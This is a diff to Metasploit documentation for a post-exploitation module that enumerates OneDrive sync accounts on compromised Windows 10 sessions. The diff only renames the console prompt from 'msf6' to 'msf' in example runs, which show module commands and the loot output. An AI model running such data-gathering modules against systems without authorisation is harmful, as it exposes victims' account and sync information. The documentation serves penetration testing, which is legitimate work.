@@ -30,8 +30,8 @@ The session to run the module on.
 
 ### Windows 10 x64 v2004 With OneDrive Installed But No Accounts
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/enum_onedrive 
-msf6 post(windows/gather/enum_onedrive) > show options
+msf exploit(multi/handler) > use post/windows/gather/enum_onedrive 
+msf post(windows/gather/enum_onedrive) > show options
 
 Module options (post/windows/gather/enum_onedrive):
 
@@ -39,9 +39,9 @@ Module options (post/windows/gather/enum_onedrive):
    ----     ---------------  --------  -----------
    SESSION  1                yes       The session to run this module on.
 
-msf6 post(windows/gather/enum_onedrive) > set SESSION 2 
+msf post(windows/gather/enum_onedrive) > set SESSION 2 
 SESSION => 2
-msf6 post(windows/gather/enum_onedrive) > run
+msf post(windows/gather/enum_onedrive) > run
 
 [-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1000: Profile doesn't exist or cannot be accessed
 [-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1001: Profile doesn't exist or cannot be accessed
@@ -53,16 +53,16 @@ msf6 post(windows/gather/enum_onedrive) > run
 [-] (HKU\S-1-5-21-3917347361-1576396349-327053466-1002) OneDrive not installed.
 
 [*] Post module execution completed
-msf6 post(windows/gather/enum_onedrive) >
+msf post(windows/gather/enum_onedrive) >
 ```
 
 ### Windows 10 x64 v2004 With OneDrive Installed and One Business and One Personal Account
 
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/enum_onedrive 
-msf6 post(windows/gather/enum_onedrive) > set SESSION 3 
+msf exploit(multi/handler) > use post/windows/gather/enum_onedrive 
+msf post(windows/gather/enum_onedrive) > set SESSION 3 
 SESSION => 3
-msf6 post(windows/gather/enum_onedrive) > run
+msf post(windows/gather/enum_onedrive) > run
 
 [-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1000: Profile doesn't exist or cannot be accessed
 [-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1001: Profile doesn't exist or cannot be accessed
@@ -101,15 +101,15 @@ msf6 post(windows/gather/enum_onedrive) > run
 
 [+] OneDrive sync information saved to /home/gwillcox/.msf4/loot/20210129095922_default_172.18.30.231_onedrive.syncinf_606475.txt in CSV format.
 [*] Post module execution completed
-msf6 post(windows/gather/enum_onedrive) > 
+msf post(windows/gather/enum_onedrive) > 
 ```
 
 ### Windows 10 x64 v2004 With OneDrive Installed and One Business and One Personal Account, But One Account Is Orphaned
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/enum_onedrive 
-msf6 post(windows/gather/enum_onedrive) > set SESSION 3 
+msf exploit(multi/handler) > use post/windows/gather/enum_onedrive 
+msf post(windows/gather/enum_onedrive) > set SESSION 3 
 SESSION => 3
-msf6 post(windows/gather/enum_onedrive) > run
+msf post(windows/gather/enum_onedrive) > run
 
 [-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1000: Profile doesn't exist or cannot be accessed
 [-] Error loading USER S-1-5-21-3917347361-1576396349-327053466-1001: Profile doesn't exist or cannot be accessed
@@ -141,5 +141,5 @@ msf6 post(windows/gather/enum_onedrive) > run
 
 [+] OneDrive sync information saved to /home/gwillcox/.msf4/loot/20210129101238_default_172.18.30.231_onedrive.syncinf_127262.txt in CSV format.
 [*] Post module execution completed
-msf6 post(windows/gather/enum_onedrive) > 
+msf post(windows/gather/enum_onedrive) > 
 ```
